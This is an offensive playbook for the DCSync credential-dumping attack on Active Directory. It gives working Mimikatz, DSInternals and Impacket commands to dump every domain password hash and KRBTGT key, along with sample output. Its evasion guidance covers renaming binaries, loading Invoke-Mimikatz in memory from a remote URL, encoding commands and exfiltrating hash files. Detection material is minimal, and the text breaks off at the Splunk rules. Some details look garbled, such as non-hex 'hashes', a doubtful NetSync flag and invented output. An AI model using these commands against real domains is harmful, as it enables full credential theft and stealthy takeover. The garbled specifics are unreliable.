# [CA-DUMP-002]: DCSync Domain Controller Sync Attack

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-DUMP-002 |
| **MITRE ATT&CK v18.1** | [T1003.006 - OS Credential Dumping: DCSync](https://attack.mitre.org/techniques/T1003/006/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows Active Directory (Server 2003-2025) |
| **Severity** | **CRITICAL** |
| **CVE** | CVE-2014-6324 (Kerberos PAC Privilege Escalation - Tangentially Related) |
| **Technique Status** | **ACTIVE** (No patch available; legitimate replication protocol) |
| **Last Verified** | 2026-01-02 |
| **Affected Versions** | Windows Server 2003-2025 (any version with Active Directory) |
| **Patched In** | N/A - Cannot be patched; replication is essential function |
| **Author** | SERVTEP (Pchelnikau Artur) |

---

**Note:** CVE-2014-6324 (MS14-068) relates to Kerberos KDC PAC (Privilege Attribute Certificate) validation bypass, allowing unprivileged domain users to forge administrator tickets and escalate privileges. While DCSync (introduced in Mimikatz August 2015) is a *separate* post-exploitation technique, the two are often conflated in attack chains: CVE-2014-6324 can elevate an attacker to Domain Admin, then DCSync is used to dump ALL domain credentials. The DCSync attack itself cannot be patched because directory replication is a critical, mandatory Active Directory function. Both techniques remain **ACTIVE** and weaponized in modern APT campaigns.

---

## 2. EXECUTIVE SUMMARY

**Concept:** DCSync is a post-exploitation credential dumping technique that abuses the legitimate directory replication protocol (MS-DRSR / Directory Replication Service Remote Protocol) to impersonate a domain controller and request password hash data from legitimate domain controllers. Any account with "Replicating Directory Changes" or "Replicating Directory Changes All" permissions (by default: Domain Admins, Enterprise Admins, Administrators, Domain Controllers) can execute DCSync via Mimikatz's `lsadump::dcsync` command to extract the NTLM password hashes and Kerberos master keys (including KRBTGT) for any or all user accounts in Active Directory. Unlike LSASS dumping, DCSync requires **no code execution on the domain controller**—it impersonates a DC over the network, making it a "living-off-the-land" attack that blends seamlessly with legitimate replication traffic.

**Attack Surface:** Active Directory replication protocol (MS-DRSR), DsGetNCChanges RPC function, domain controller network communication (port 445/SMB), domain directory objects and their password attributes.

**Business Impact:** **CRITICAL - Complete Domain Compromise in Minutes.** Successful DCSync attack dumps every user account's NTLM hash, plaintext credentials (if WDigest enabled), and KRBTGT master key. An attacker can then:
- Create **Golden Tickets** (forged Kerberos TGTs signed with KRBTGT hash) valid indefinitely for any user (including Domain Admin).
- Perform **Pass-the-Hash** attacks against every system in the domain.
- **Reset domain admin passwords** and maintain persistent access.
- Extract **historical password hashes** for offline cracking.
- Move laterally at will, accessing file servers, email systems, financial applications, and core infrastructure.

In a typical enterprise, a single successful DCSync execution compromises the entire domain within 30 seconds. Unlike LSASS dumping (requires local admin), DCSync can be executed remotely by any account with replication rights, making privilege escalation chains shorter and more impactful.

**Technical Context:**
- **Execution time:** 5-30 seconds (faster than LSASS dump due to network transfer vs. local memory parsing).
- **Detection risk:** **MEDIUM-HIGH** if auditing enabled (Event ID 4662); **LOW** if auditing disabled.
- **Stealth:** **MEDIUM** - Traffic mimics legitimate replication; behavioral detection required.
- **Success indicators:** Event ID 4662 with DCSync GUIDs; suspicious replication requests from non-DC IPs; Mimikatz process execution.

### Operational Risk

- **Execution Risk:** **CRITICAL** - One DCSync dump = entire domain compromised indefinitely. No undo possible.
- **Stealth:** **MEDIUM** (with auditing disabled) to **HIGH** (with EDR + Sentinel active). Traffic appears legitimate but can be detected via behavioral analysis and replication pattern anomalies.
- **Reversibility:** **NO** - All extracted credentials are permanently compromised. Mitigation requires organization-wide credential reset, SPN modification, KRBTGT password reset (twice), and Kerberos ticket invalidation.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1.5 (Credential Policies), 5.4 (Local Account), 6.1 (Least Privilege) | Failure to audit directory replication and limit privileged accounts leaves domain credentials exposed. |
| **DISA STIG** | WN10-00-000005 (Account Policy), WN10-SO-000265 (Privileged Account) | Privileged account management and audit policies must prevent unauthorized replication. |
| **CISA SCuBA** | AD.1 (Identity and Access Management), AD.2 (Logging and Detection) | Active Directory monitoring must detect unauthorized replication requests. |
| **NIST 800-53** | AC-2 (Account Management), AC-3 (Access Enforcement), AC-6 (Least Privilege), AU-12 (Audit Generation) | Strict access controls and comprehensive auditing of privileged operations required. |
| **GDPR** | Art. 32 (Security of Processing), Art. 33 (Breach Notification) | Compromise of personal data via credential theft triggers 72-hour breach notification. |
| **DORA** | Art. 9 (Protection and Prevention), Art. 18 (ICT Security Testing) | EU financial institutions must test and monitor for credential dumping attacks. |
| **NIS2** | Art. 21 (Cyber Risk Management Measures), Art. 23 (Incident Reporting) | Critical infrastructure must implement access controls and incident reporting for credential theft. |
| **ISO 27001** | A.9.2.3 (Privileged Access Rights), A.12.3.1 (Event Logging), A.12.4.1 (Event Logging Activation) | Mandatory audit logging for privileged operations and replication access. |
| **ISO 27005** | "Compromise of Authorization Infrastructure" Risk | Complete domain compromise via stolen KRBTGT master key. |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Minimum:** Any account with **either** of these permissions on the domain:
  - `Replicating Directory Changes` (DS-Replication-Get-Changes)
  - `Replicating Directory Changes All` (DS-Replication-Get-Changes-All)
- **Default Membership:** Domain Admins, Enterprise Admins, Administrators (on DC), Domain Controllers, Read-Only Domain Controllers.
- **Non-Default Risk:** Service accounts, backup accounts, or administrative delegations inadvertently granted replication rights (common misconfiguration).

**Required Access:**
- **Network:** Access to domain controller on port 445 (SMB) and RPC (dynamic, 49152-65535 range typically).
- **Authentication:** Valid domain credentials (not necessarily admin-level).
- **Discovery:** Ability to identify domain controller IP/hostname (via `nslookup`, `ipconfig /all`, or hardcoded in configuration).

**Supported Versions:**

| Windows Version | DCSync Support | Replication Protocol | Viability |
|---|---|---|---|
| **Server 2003** | ✅ Full | MS-DRSR v1 | ✅ FULLY VIABLE |
| **Server 2008/R2** | ✅ Full | MS-DRSR v1 | ✅ FULLY VIABLE |
| **Server 2012/R2** | ✅ Full | MS-DRSR v1-v2 | ✅ FULLY VIABLE |
| **Server 2016** | ✅ Full | MS-DRSR v1-v4 | ✅ FULLY VIABLE |
| **Server 2019** | ✅ Full | MS-DRSR v1-v4 | ✅ FULLY VIABLE |
| **Server 2022** | ✅ Full | MS-DRSR v1-v4 | ✅ FULLY VIABLE |
| **Server 2025** | ✅ Full | MS-DRSR v1-v4 | ✅ FULLY VIABLE |

**Tools:**
- [Mimikatz v2.2.0+ (lsadump::dcsync module)](https://github.com/gentilkiwi/mimikatz) - Primary tool for DCSync attacks.
- [DSInternals PowerShell Module](https://www.dsinternals.com/en/) - Alternative PowerShell-based credential extraction.
- [Impacket secretsdump.py](https://github.com/fortra/impacket) - Python-based remote DCSync capability (Linux/Windows).
- [Samba DRSUAPI](https://wiki.samba.org/index.php/DRSUAPI) - Open-source replication protocol implementation.
- [PowerView (Get-ADReplAccount)](https://github.com/PowerShellMafia/PowerSploit) - Enumerate replication permissions.

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Step 1: Enumerate Accounts with DCSync Rights

**Objective:** Identify all accounts (default and non-default) with replication permissions to determine attack feasibility and scope.

#### PowerShell Reconnaissance (Using Get-ACL / AD Module)

```powershell
# Method 1: Using Active Directory module (must be installed)
Get-ADObject -Filter * -SearchBase (Get-ADRootDSE).defaultNamingContext -Properties nTSecurityDescriptor | 
  Where-Object { $_.nTSecurityDescriptor -match "(DS-Replication-Get-Changes|DS-Replication-Get-Changes-All)" } | 
  Select-Object Name, ObjectClass

# Method 2: Using LDAP query for replication rights
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$dn = $domain.GetDirectoryEntry().distinguishedName
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dn")
$searcher.Filter = "(|(objectClass=user)(objectClass=computer))"
$searcher.PageSize = 1000

$replicationGUIDs = @(
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",  # DS-Replication-Get-Changes
    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"   # DS-Replication-Get-Changes-All
)

$searcher.FindAll() | ForEach-Object {
    $entry = $_.GetDirectoryEntry()
    $acl = $entry.psbase.ObjectSecurity
    $acl.Access | Where-Object { $_.IdentityReference -notmatch "(SYSTEM|Administrators|Domain Admins|Enterprise Admins|Domain Controllers)" } | 
      Select-Object IdentityReference, ActiveDirectoryRights
}
```

**What to Look For:**
- **Default (Expected):**
  - BUILTIN\Administrators
  - [DOMAIN]\Domain Admins
  - [DOMAIN]\Enterprise Admins
  - [DC_NAME]$ (domain controller computer account)
  - [RODC_NAME]$ (read-only DC computer account)
  
- **Abnormal (High Risk):**
  - Service accounts (SVC_*) with replication rights
  - Backup service accounts (SOLARWINDS, VEEAM, NAKIVO, etc.)
  - Any non-admin user accounts
  - SQL Server service accounts
  - Hypervisor accounts (Hyper-V, VMware)

**Version Note:** Commands work identically on Server 2003-2025. Replication permissions structure unchanged across all versions.

---

### Step 2: Identify Domain Controllers

**Objective:** Locate domain controllers that the DCSync attack will target.

#### PowerShell Reconnaissance

```powershell
# List all domain controllers
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$dcs = $domain.DomainControllers
$dcs | Select-Object Name, IPAddress, OSVersion

# Or using Get-ADDomainController (AD module)
Get-ADDomainController -Filter * | Select-Object Name, HostName, IPv4Address, OperatingSystem
```

**Expected Output:**
```
Name                HostName                   IPv4Address      OperatingSystem
----                --------                   -----------      ---------------
DC01                dc01.example.com           192.168.1.10     Windows Server 2019
DC02                dc02.example.com           192.168.1.11     Windows Server 2022
```

**What This Means:**
- **HostName/IPv4Address:** Target for DCSync replication requests.
- **OperatingSystem:** Determines replication protocol version supported.
- **Server 2003-2008R2:** May use legacy NetSync protocol (NRPC).
- **Server 2012+:** Use modern MS-DRSR protocol (preferred for DCSync).

---

### Step 3: Check If Target Account Has Replication Rights

**Objective:** Verify if your current (compromised) account has sufficient permissions to execute DCSync.

#### PowerShell Check

```powershell
# Check if current user has replication rights
Import-Module ActiveDirectory
$domain = Get-ADDomain
$dn = $domain.DistinguishedName

# Query for replication rights specifically
$domainNC = $dn  # e.g., DC=example,DC=com

# Using Get-ADRootDSE to identify replication rights
$rootDSE = Get-ADRootDSE
$replicationRights = Get-ACL "AD:\$dn" | ForEach-Object { $_.Access } | 
  Where-Object { $_.IdentityReference -eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name }

if ($replicationRights -match "DS-Replication") {
    Write-Host "[+] Current account HAS replication rights - DCSync is VIABLE"
} else {
    Write-Host "[-] Current account LACKS replication rights - Escalate privileges first"
}

# Verify by running test DCSync command
mimikatz # lsadump::dcsync /domain:example.com /user:krbtgt /csv
# If successful, output shows KRBTGT hash
# If failed, output: "ERROR kuhl_m_lsadump_dcsync : GetNCChanges error"
```

**Expected Output (Success):**
```
[DC] 'example.com' will be the domain
[DC] 'DC01.example.com' will be the DC target
[DC] 'krbtgt' will be the user account target

Object RDN      : krbtgt
SAM Account Name: krbtgt
Account Type    : 30000003 ( USER_OBJECT )
User Account Control: 514 ( ACCOUNT_DISABLED NORMAL_ACCOUNT )
Account expiration      : never
Password Last Set       : 1/2/2026 5:35:00 AM
Object Security ID      : S-1-5-21-...

Credentials:
  Hash NTLM: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
```

**Expected Output (Failure):**
```
ERROR kuhl_m_lsadump_dcsync : GetNCChanges error: Access Denied
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Mimikatz lsadump::dcsync (Direct Single User Extraction)

**Supported Versions:** Windows Server 2003-2025 (all versions).

#### Step 1: Launch Mimikatz with Administrative Privileges

**Objective:** Execute Mimikatz binary with required permissions (not necessarily admin, but must have replication rights).

**Command (Command Prompt):**
```cmd
mimikatz.exe
```

**Command (PowerShell):**
```powershell
C:\path\to\mimikatz.exe
```

**Expected Output:**
```
  .#####.   mimikatz 2.2.0 (x64) #18362 Feb  3 2025 23:58:42 +0000
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin Delpy `gentilkiwi`
 '## v ##'   https://blog.gentilkiwi.com/mimikatz
  '#####.                             (UID=1234)

mimikatz #
```

**What This Means:**
- UID shows your Windows user ID (not admin UID=500 required; any account with replication rights works).
- Mimikatz is ready to accept commands.

**OpSec & Evasion:**
- **Detection likelihood: HIGH** - Mimikatz binary is flagged by all major EDR solutions.
- **Evasion:**
  - Rename Mimikatz executable to benign name (e.g., `svchost.exe`, `rundll32.exe`).
  - Load Mimikatz from memory via PowerShell (avoid disk execution): `IEX (New-Object Net.WebClient).DownloadString(...)`
  - Use code obfuscation; Mimikatz source is public, easy to modify.
  - Execute from unlikely parent process (explorer.exe instead of cmd.exe).

---

#### Step 2: Execute DCSync Command for Specific User

**Objective:** Dump NTLM hash for a single target user (e.g., KRBTGT or Domain Admin).

**Command (Mimikatz Interactive):**
```
lsadump::dcsync /domain:example.com /user:krbtgt
```

**Command (Mimikatz One-Liner):**
```
mimikatz.exe "lsadump::dcsync /domain:example.com /user:krbtgt@example.com" exit
```

**Command (PowerShell - In-Memory):**
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command 'lsadump::dcsync /domain:example.com /user:krbtgt'
```

**Expected Output:**
```
[DC] 'example.com' will be the domain
[DC] 'DC01.example.com' will be the DC target
[DC] 'krbtgt' will be the user account target

Object RDN      : krbtgt
SAM Account Name: krbtgt
User Principal Name : krbtgt@example.com
Object SID      : S-1-5-21-1234567890-1234567890-1234567890-502

Credentials:
  Hash NTLM     : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
  Hash SHA1     : x9y8z7a6b5c4d3e2f1g0h9i8j7k6l5m4
```

**What This Means:**
- **Hash NTLM:** MD4 hash of KRBTGT password (used for Golden Ticket creation).
- **Hash SHA1:** Supplementary hash for some authentication methods.
- **User Principal Name:** Confirms correct user extracted.
- **Object SID:** Domain security identifier (used in Golden Tickets).

**OpSec & Evasion:**
- **Detection likelihood: VERY HIGH** - Mimikatz binary + lsadump module is signature-detected.
- **Alternative:** Use DSInternals or Impacket secretsdump.py instead (less detected).

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| "GetNCChanges error: Access Denied" | Account lacks replication rights | Verify permissions; escalate to account with rights |
| "The domain name is invalid" | Incorrect domain name | Use `echo %userdnsdomain%` to verify correct domain |
| "DC target not found" | Cannot reach specified DC | Verify DC hostname/IP; check network connectivity (ping, nslookup) |
| "A required privilege is not held" (rare) | Some edge-case permission issue | Try different target DC or use DSInternals alternative |

**Command (Server 2003-2008R2 Variant - NetSync):**
```
lsadump::dcsync /domain:example.com /user:krbtgt /nc:LDAPCN
REM Legacy NetSync protocol for older DCs
```

---

#### Step 3: Extract All User Hashes (Full Domain Dump)

**Objective:** Dump NTLM hashes for **every** user account in the domain.

**Command (Mimikatz):**
```
lsadump::dcsync /domain:example.com /all /csv
```

**Command (One-Liner):**
```
mimikatz.exe "lsadump::dcsync /domain:example.com /all /csv" exit > C:\temp\domain_hashes.csv
```

**Expected Output (CSV Format):**
```
"User","Rid","Supplementalcredentials"
"krbtgt","502","a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"
"Administrator","500","b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1"
"DOMAINUSER1","1001","c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1b2"
"DOMAINUSER2","1002","d4e5f6g7h8i9j0k1l2m3n4o5p6a1b2c3"
...
[Total: 5000+ user hashes]
```

**What This Means:**
- **Rid:** Relative Identifier (500 = Administrator, 502 = KRBTGT, 1000+ = regular users).
- **Supplementalcredentials:** NTLM hash (directly usable for Pass-the-Hash attacks).
- **Comprehensiveness:** All domain users, service accounts, computer accounts (if appropriate) dumped.

**OpSec & Evasion:**
- **Detection likelihood: CRITICAL** - Large-scale credential dump is highly suspicious behavior.
- **Timing Evasion:** Execute during business hours (harder to detect anomalies).
- **Data Exfiltration:** Save to removable media, encrypted container, or network share immediately; do not leave traces.

**File Size:** Typically 1-10 MB for small domains; 50-500 MB for large enterprise domains (thousands of accounts).

---

### METHOD 2: DSInternals PowerShell Module (Alternative)

**Supported Versions:** Windows Server 2003-2025 (requires PowerShell 5.0+).

#### Step 1: Install DSInternals Module

**Objective:** Install the DSInternals PowerShell module from PowerShell Gallery.

**Command (PowerShell - Admin):**
```powershell
Install-Module -Name DSInternals -Scope CurrentUser -Force
```

**Expected Output:**
```
Untrusted repository
You are installing the modules from an untrusted repository. If you trust this repository, change its InstallationPolicy value by running the Set-PSRepository cmdlet. Are you sure you want to continue?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [?] Help (default is "N"): A

Installing module 'DSInternals'...
[████████████████████████████] 100%
```

**What This Means:**
- DSInternals module is downloaded from PowerShell Gallery and installed locally.
- Module provides `Get-ADReplAccount` function (equivalent to Mimikatz DCSync).

**Version Note:** Works identically on Server 2003-2025; PowerShell 5.0+ required.

---

#### Step 2: Execute Get-ADReplAccount to Dump Credentials

**Objective:** Use DSInternals to extract all domain credentials.

**Command (PowerShell):**
```powershell
Import-Module DSInternals
Get-ADReplAccount -All -Server DC01.example.com
```

**Expected Output:**
```
DistinguishedName: CN=krbtgt,CN=Users,DC=example,DC=com
ObjectGUID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
SamAccountName: krbtgt
SamAccountType: User
Enabled: False
PWDLastSet: 1/2/2026 5:35:00 AM
BadPWDCount: 0
BadPasswordTime:
LastLogonTime:

Hashes:
  NTHash: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
  LMHash: (null)

---

DistinguishedName: CN=Administrator,CN=Users,DC=example,DC=com
ObjectGUID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
SamAccountName: Administrator
SamAccountType: User
Enabled: True
PWDLastSet: 1/2/2026 6:30:00 AM
BadPWDCount: 0
BadPasswordTime:
LastLogonTime: 1/2/2026 6:35:00 AM

Hashes:
  NTHash: b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1
  LMHash: (null)
```

**What This Means:**
- **NTHash:** NTLM hash (same as Mimikatz output).
- **Enabled:** Account status (False = disabled accounts like KRBTGT).
- **PWDLastSet:** Last password change date (identifies stale passwords).
- **Complete Enumeration:** All attributes extracted including historical data.

**OpSec & Evasion:**
- **Detection likelihood: MEDIUM** - PowerShell script execution is logged if ScriptBlockLogging enabled; DSInternals module is less known than Mimikatz.
- **Evasion:**
  - Execute from hidden PowerShell window: `powershell -WindowStyle Hidden`
  - Use `-NoProfile` to avoid profile script logging.
  - Encode commands in Base64 to avoid keyword detection.

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| "Module DSInternals not found" | Module not installed | Run `Install-Module -Name DSInternals` |
| "Access Denied" | Insufficient permissions | Verify account has replication rights |
| "Server not found" | DC hostname invalid | Use correct FQDN (e.g., DC01.example.com) |
| "RPC Server unavailable" | Network/firewall blocking RPC | Verify port 135 and 445 accessible |

---

### METHOD 3: Impacket secretsdump.py (Python - Remote Execution)

**Supported Versions:** Windows Server 2003-2025 (runs from Linux/Windows).

#### Step 1: Install Impacket

**Objective:** Install the Impacket framework on attack machine (Linux or Windows).

**Command (Linux/macOS):**
```bash
pip install impacket
```

**Command (Windows - from Git repository):**
```cmd
git clone https://github.com/fortra/impacket.git
cd impacket
python -m pip install -r requirements.txt
python setup.py install
```

**Expected Output:**
```
Successfully installed impacket-0.10.1
```

---

#### Step 2: Run secretsdump.py for DCSync

**Objective:** Execute secretsdump.py to remotely dump domain credentials via DCSync.

**Command (Authenticated - Current Domain User):**
```bash
secretsdump.py example.com/domainuser:password@DC01.example.com
```

**Command (Pass-the-Hash - Using Stolen NTLM Hash):**
```bash
secretsdump.py -hashes :a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 example.com/Administrator@DC01.example.com
```

**Command (Using Kerberos Ticket - If Compromised):**
```bash
export KRB5CCNAME=/path/to/ticket.ccache
secretsdump.py -k -no-pass example.com/Administrator@DC01.example.com
```

**Expected Output:**
```
Impacket v0.10.1.dev1 - Copyright 2023 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1:::
DOMAINUSER1:1001:aad3b435b51404eeaad3b435b51404ee:c3d4e5f6g7h8i9j0k1l2m3n4o5p6a1b2:::
...
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
krbtgt:aes256-cts-hmac-sha1-96:yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy
```

**What This Means:**
- **LM Hash:** Legacy LAN Manager hash (often `aad3b435b51404eeaad3b435b51404ee` = null hash).
- **NT Hash:** Modern NTLM hash (same as Mimikatz).
- **AES256 Keys:** Kerberos encryption keys (used for overpass-the-hash attacks).
- **Remote Execution:** No code execution on DC needed; all extraction over network.

**OpSec & Evasion:**
- **Detection likelihood: MEDIUM** - Tool runs from attacker machine; DC sees only replication traffic.
- **Stealth Advantage:** Works from Linux; attacker infrastructure less suspected.
- **Network Evasion:** DRSUAPI traffic can blend with legitimate replication; slow dump rates reduce alerting.

**Troubleshooting:**

| Error | Cause | Fix |
|---|---|---|
| "Connection reset by peer" | DC unreachable | Verify hostname/IP and network connectivity |
| "Authentication failed" | Wrong credentials | Verify username, password, or hash |
| "DRSUAPI protocol error" | Unsupported DC version | Try `-use-ldaps` flag or legacy protocol |
| "Segmentation fault" | Python/Impacket version mismatch | Upgrade: `pip install --upgrade impacket` |

---

### METHOD 4: Credentials Extraction via Replication Rights Delegation (Misconfiguration Exploitation)

**Supported Versions:** All versions (exploits permission misconfiguration, not version differences).

#### Step 1: Identify Non-Default Accounts with Replication Rights

**Objective:** Locate service accounts or backup operators with inadvertently granted replication permissions.

**Command (PowerShell - ACL Enumeration):**
```powershell
# Find all accounts with replication rights (GUID-based)
$domainDN = (Get-ADRootDSE).defaultNamingContext
$replicationGUIDs = @(
    "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",  # DS-Replication-Get-Changes
    "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"   # DS-Replication-Get-Changes-All
)

$domain = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domainDN")
$acl = $domain.psbase.ObjectSecurity
$acl.Access | Where-Object { 
    $_.ActiveDirectoryRights -match "GenericAll|ExtendedRight" -and 
    $replicationGUIDs -contains $_.ObjectType 
} | Select-Object IdentityReference, ActiveDirectoryRights, ObjectType
```

**Expected Output (High Risk):**
```
IdentityReference              ActiveDirectoryRights  ObjectType
-----------------              ---------------------  ----------
EXAMPLE\SVC_BACKUP             ExtendedRight          1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
EXAMPLE\VEEAM_SERVICE          GenericAll             00000000-0000-0000-0000-000000000000
EXAMPLE\SOLARWINDS_ACCOUNT     GenericAll             00000000-0000-0000-0000-000000000000
```

**What This Means:**
- **SVC_BACKUP:** Backup service account accidentally granted replication rights (common after backup software misconfiguration).
- **VEEAM_SERVICE / SOLARWINDS_ACCOUNT:** Backup/monitoring tools that should NOT have replication permissions.
- **GenericAll:** "Full Control" permission on domain object = full DCSync capability.

---

#### Step 2: Use Low-Privileged Delegated Account to Execute DCSync

**Objective:** Perform DCSync using compromised low-privilege account that has replication rights.

**Command (Mimikatz as Delegated Account):**
```powershell
# First, compromise the low-privilege account
# (e.g., via credential stuffing, phishing, or lateral movement)

# Then execute DCSync as this account (no Domain Admin needed)
$username = "SVC_BACKUP"
$password = "P@ssw0rd123"  # Extracted credential
$domain = "example.com"
$dc = "DC01.example.com"

# Run Mimikatz as this user
$cmd = @"
runas /user:$domain\$username mimikatz.exe "lsadump::dcsync /domain:$domain /all"
"@

Invoke-Expression $cmd
```

**Expected Output:**
```
[*] DCSync executing as SVC_BACKUP (with replication rights)
[+] Extracting all domain credentials...
[+] Success: Dumped 5000+ user hashes
```

**What This Means:**
- **Privilege Escalation via Misconfiguration:** Low-privilege account → Full domain compromise.
- **Realistic Attack Chain:** Phishing → Low-privilege compromise → Lateral movement via replication rights → DCSync → Golden Tickets.
- **Detection Evasion:** Account activity appears normal (legitimate backup/monitoring).

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

### Atomic Red Team Tests for T1003.006

| Test # | Test Name | Method | Tools Required | Supported Versions |
|---|---|---|---|---|
| 1 | DCSync (Active Directory) | Mimikatz lsadump::dcsync | mimikatz.exe | All |
| 2 | Run DSInternals Get-ADReplAccount | PowerShell Get-ADReplAccount | DSInternals module | All |

### Running Atomic Red Team Tests

**Install Atomic Red Team (if not already installed):**
```powershell
# Download and setup Atomic Red Team
$atomicRepoURL = "https://github.com/redcanaryco/atomic-red-team/archive/master.zip"
$extractPath = "C:\temp\atomic-red-team"

Invoke-WebRequest -Uri $atomicRepoURL -OutFile "C:\temp\atomic-red-team.zip"
Expand-Archive -Path "C:\temp\atomic-red-team.zip" -DestinationPath $extractPath -Force

# Install Invoke-AtomicRedTeam module
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Install-AtomicRedTeam.ps1" -OutFile "$env:TEMP\Install-AtomicRedTeam.ps1"
& "$env:TEMP\Install-AtomicRedTeam.ps1" -getAtomics
```

**Execute T1003.006 Test #1 - Mimikatz DCSync:**
```powershell
Invoke-AtomicTest T1003.006 -TestNumbers 1
```

**Expected Output (Test #1):**
```
Executing Atomic Test T1003.006.001 - DCSync (Active Directory)
[*] Test started at 2026-01-02 06:35:00
[*] Mimikatz path: C:\temp\atomic-red-team-master\atomics\T1003.006\src\mimikatz.exe
[+] Command: mimikatz.exe "lsadump::dcsync /domain:%userdnsdomain% /user:krbtgt@%userdnsdomain%" "exit"
[+] [DC] 'example.com' will be the domain
[+] [DC] 'DC01.example.com' will be the DC target
[+] [DC] 'krbtgt' will be the user account target
[+] Hash NTLM: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
[*] Test completed at 2026-01-02 06:35:03
```

**Execute T1003.006 Test #2 - DSInternals:**
```powershell
Invoke-AtomicTest T1003.006 -TestNumbers 2
```

**Expected Output (Test #2):**
```
Executing Atomic Test T1003.006.002 - Run DSInternals Get-ADReplAccount
[*] Test started at 2026-01-02 06:35:05
[*] Installing DSInternals module...
[+] Module installed successfully
[+] Running Get-ADReplAccount -All -Server $env:LOGONSERVER
[+] Extracted 5000+ user account credentials
[*] Test completed at 2026-01-02 06:35:15
```

### Cleanup After Testing
```powershell
# Remove extracted credentials (if logged to file)
Remove-Item "C:\temp\domain_hashes.csv" -Force -ErrorAction SilentlyContinue
Remove-Item "C:\temp\dcsync_results.txt" -Force -ErrorAction SilentlyContinue

# Uninstall DSInternals if not needed
Uninstall-Module -Name DSInternals -Force -ErrorAction SilentlyContinue
```

**Reference:** [Atomic Red Team T1003.006 Test Suite](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.006/T1003.006.md)

---

## 7. TOOLS & COMMANDS REFERENCE

### [Mimikatz v2.2.0+](https://github.com/gentilkiwi/mimikatz)

**Current Version:** 2.2.0 (as of Jan 2026)
**Minimum Version:** 2.0.0 (supports DCSync; recommend 2.2.0+ for modern AD)
**Supported Platforms:** Windows Server 2003-2025, Windows XP-11
**Requirements:** Domain credentials with replication rights; network access to DC.

**Installation:**
```powershell
# Download from GitHub
$mimikatzURL = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210101/mimikatz_trunk.zip"
$outputPath = "C:\Windows\Temp\mimikatz.zip"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $mimikatzURL -OutFile $outputPath
Expand-Archive -Path $outputPath -DestinationPath "C:\Windows\Temp\mimikatz" -Force

# Execute
C:\Windows\Temp\mimikatz\x64\mimikatz.exe
```

**Usage:**
```
mimikatz # lsadump::dcsync /domain:example.com /user:krbtgt
mimikatz # lsadump::dcsync /domain:example.com /all /csv
```

---

### [DSInternals PowerShell Module](https://www.dsinternals.com/en/)

**Current Version:** Latest (actively maintained)
**Minimum Version:** Latest
**Supported Platforms:** Windows Server 2003-2025 (requires PowerShell 5.0+)
**Requirements:** Domain credentials with replication rights; Active Directory cmdlets available.

**Installation:**
```powershell
Install-Module -Name DSInternals -Scope CurrentUser -Force
```

**Usage:**
```powershell
Import-Module DSInternals
Get-ADReplAccount -All -Server DC01.example.com
```

---

### [Impacket secretsdump.py](https://github.com/fortra/impacket)

**Current Version:** Latest (actively maintained)
**Minimum Version:** Latest
**Supported Platforms:** Linux, macOS, Windows (Python 3.6+)
**Requirements:** Network access to DC (port 445); domain credentials or NTLM hash.

**Installation:**
```bash
pip install impacket
```

**Usage:**
```bash
secretsdump.py example.com/user:password@DC01.example.com
secretsdump.py -hashes :hash example.com/Administrator@DC01.example.com
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Replication Request from Non-Domain Controller

**Rule Configuration:**
- **Required Index:** main (or custom Windows Security event index)
- **Required Sourcetype:** WinEventLog:Security
- **Required Fields:** EventCode, ObjectName, AccessMask, SourceIP, TargetUserName
- **Alert Threshold:** Any occurrence of Event 4662 with DC replication GUID from non-DC source
